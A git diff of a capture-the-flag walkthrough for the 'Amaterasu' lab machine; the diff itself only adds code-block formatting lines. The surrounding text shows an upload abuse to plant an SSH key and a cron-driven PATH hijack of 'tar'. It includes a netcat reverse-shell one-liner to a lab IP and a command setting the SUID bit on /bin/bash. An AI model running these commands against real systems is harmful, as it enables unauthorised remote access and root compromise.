@@ -20,6 +20,7 @@ image:
 ```bash
 IP : 192.168.171.249
 ```
+{: .nolineno}
 
 ## Port Scan Results ➡️
 
@@ -110,6 +111,7 @@ PORT      STATE  SERVICE          VERSION
 |_http-title: My test page
 |_http-server-header: Apache/2.4.53 (Fedora)
 ```
+{: .nolineno}
 
 ---
 
@@ -155,6 +157,7 @@ Connection: close
 
 {"message":"No file part in the request"}
 ```
+{: .nolineno}
 
 Now I have to include the headers for File upload so lets take an `example.txt` as a file name for uploading into the web →
 
@@ -180,6 +183,7 @@ Connection: close
 
 {"message":"Allowed file types are txt, pdf, png, jpg, jpeg, gif"}
 ```
+{: .nolineno}
 
 So now lets try that file to upload into the users directory →
 
@@ -195,6 +199,7 @@ Connection: close
 
 {"message":"File successfully uploaded"}
 ```
+{: .nolineno}
 
 ![Untitled](/Vulnhub-Files/img/Amaterasu/Untitled%2010.png)
 
@@ -226,6 +231,7 @@ The keys randomart image is:
 |        ...      |
 +----[SHA256]-----+
 ```
+{: .nolineno}
 
 Now I first tried it I failed because it does not contains any extensions so I converted into .txt extension then I tried it →
 
@@ -243,6 +249,7 @@ Connection: close
 
 {"message":"File successfully uploaded"}
 ```
+{: .nolineno}
 
 ---
 
@@ -268,6 +275,7 @@ uid=1000(alfredo) gid=1000(alfredo) groups=1000(alfredo)
 /home/alfredo
 [alfredo@fedora ~]$
 ```
+{: .nolineno}
 
 Now here is local.txt file →
 
@@ -276,6 +284,7 @@ Now here is local.txt file →
 b25a3490ade72606c99eb6e1fe38db7a
 [alfredo@fedora ~]$
 ```
+{: .nolineno}
 
 Now while enumeration further I checked cronjob file I got this →
 
@@ -301,6 +310,7 @@ MAILTO=root
 */1 * * * * root /usr/local/bin/backup-flask.sh
 [alfredo@fedora ~]$
 ```
+{: .nolineno}
 
 Now lets see the `/usr/local/bin/backup-flask.sh` file →
 
@@ -313,6 +323,7 @@ tar czf /tmp/flask.tar.gz *
 
 [alfredo@fedora restapi]$
 ```
+{: .nolineno}
 
 So I see that the path changes to /home/alfredo/restapi so lets move accordingly , and create a file named as tar with executable permissions and that file show contains this →
 
@@ -324,6 +335,7 @@ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.45.234 4444 >/tmp/
 chmod u+s /bin/bash
 [alfredo@fedora restapi]$
 ```
+{: .nolineno}
 
 I tried for reverse shell but not got that So what I did was that the script add a SUID bit to a binary , that I will have access to. The script runs every minute (according to the crontab). So a minute later I check the find binary and…
 
@@ -334,6 +346,7 @@ I tried for reverse shell but not got that So what I did was that the script add
 [alfredo@fedora restapi]$ ls -al /bin/bash
 -rwsr-xr-x. 1 root root 1390080 Jan 25  2021 /bin/bash
 ```
+{: .nolineno}
 
 Now lets root this machine with bash command →
 
